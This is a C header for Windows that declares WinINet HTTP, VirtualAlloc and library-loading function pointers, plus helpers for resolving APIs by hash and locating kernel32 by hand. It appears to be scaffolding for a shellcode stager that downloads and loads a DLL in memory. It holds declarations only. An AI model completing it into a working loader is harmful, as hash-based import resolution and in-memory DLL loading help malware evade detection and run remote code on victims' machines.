#pragma once
#include <windows.h>
#include <wininet.h>

typedef FARPROC(WINAPI* FN_GetProcAddress)(
	_In_ HMODULE hModule,
	_In_ LPCSTR lpProcName
	);

typedef HMODULE(WINAPI* FN_LoadLibraryA)(
	_In_ LPCSTR lpLibFileName
	);

typedef int(WINAPI* FN_MessageBoxA)(
	_In_opt_ HWND hWnd,
	_In_opt_ LPCSTR lpText,
	_In_opt_ LPCSTR lpCaption,
	_In_ UINT uType);

typedef HINTERNET(WINAPI* FN_InternetOpenA)(
	_In_opt_ LPCSTR lpszAgent,
	_In_ DWORD dwAccessType,
	_In_opt_ LPCSTR lpszProxy,
	_In_opt_ LPCSTR lpszProxyBypass,
	_In_ DWORD dwFlags);

typedef HINTERNET(WINAPI* FN_InternetConnectA)(
	_In_ HINTERNET hInternet,
	_In_ LPCSTR lpszServerName,
	_In_ INTERNET_PORT nServerPort,
	_In_opt_ LPCSTR lpszUserName,
	_In_opt_ LPCSTR lpszPassword,
	_In_ DWORD dwService,
	_In_ DWORD dwFlags,
	_In_opt_ DWORD_PTR dwContext);

typedef HINTERNET(WINAPI* FN_HttpOpenRequestA)(
	_In_ HINTERNET hConnect,
	_In_opt_ LPCSTR lpszVerb,
	_In_opt_ LPCSTR lpszObjectName,
	_In_opt_ LPCSTR lpszVersion,
	_In_opt_ LPCSTR lpszReferrer,
	_In_opt_z_ LPCSTR FAR* lplpszAcceptTypes,
	_In_ DWORD dwFlags,
	_In_opt_ DWORD_PTR dwContext);

typedef BOOL (WINAPI* FN_HttpSendRequestA)(
	_In_ HINTERNET hRequest,
	_In_reads_opt_(dwHeadersLength) LPCSTR lpszHeaders,
	_In_ DWORD dwHeadersLength,
	_In_reads_bytes_opt_(dwOptionalLength) LPVOID lpOptional,
	_In_ DWORD dwOptionalLength);

typedef BOOL(WINAPI* FN_InternetReadFile)(
	_In_ HINTERNET hFile,
	_Out_writes_bytes_(dwNumberOfBytesToRead) __out_data_source(NETWORK) LPVOID lpBuffer,
	_In_ DWORD dwNumberOfBytesToRead,
	_Out_ LPDWORD lpdwNumberOfBytesRead);

typedef BOOL(WINAPI* FN_HttpQueryInfoA)(
	_In_ HINTERNET hRequest,
	_In_ DWORD dwInfoLevel,
	_Inout_updates_bytes_to_opt_(*lpdwBufferLength, *lpdwBufferLength) __out_data_source(NETWORK) LPVOID lpBuffer,
	_Inout_ LPDWORD lpdwBufferLength,
	_Inout_opt_ LPDWORD lpdwIndex);

typedef LPVOID(WINAPI* FN_VirtualAlloc)(
	_In_opt_ LPVOID lpAddress,
	_In_     SIZE_T dwSize,
	_In_     DWORD flAllocationType,
	_In_     DWORD flProtect);

typedef struct tagApiInterface {
	FN_GetProcAddress pfnGetProcAddress;
	FN_LoadLibraryA pfnLoadLibrary;
	FN_MessageBoxA pfnMessageBoxA;
	FN_VirtualAlloc pfnVirtualAlloc;
	FN_InternetConnectA pfnInternetConnectA;
	FN_HttpOpenRequestA pfnHttpOpenRequestA;
	FN_HttpSendRequestA pfnHttpSendRequestA;
	FN_InternetReadFile pfnInternetReadFile;
	FN_InternetOpenA pfnInternetOpenA;
	FN_HttpQueryInfoA pfnHttpQueryInfoA;
	PVOID pDllBuffer;
}APIINTERFACE,*PAPIINTERFACE;

DWORD MyGetProcAddress(HMODULE hModule, DWORD lpProcName);
//DWORD MyGetProcAddress(HMODULE hModule, LPCSTR lpProcName);
HMODULE GetKernel32Base();
BOOL MyStrcmp(DWORD str1, char* str2);
DWORD GetProcHash(char* lpProcName);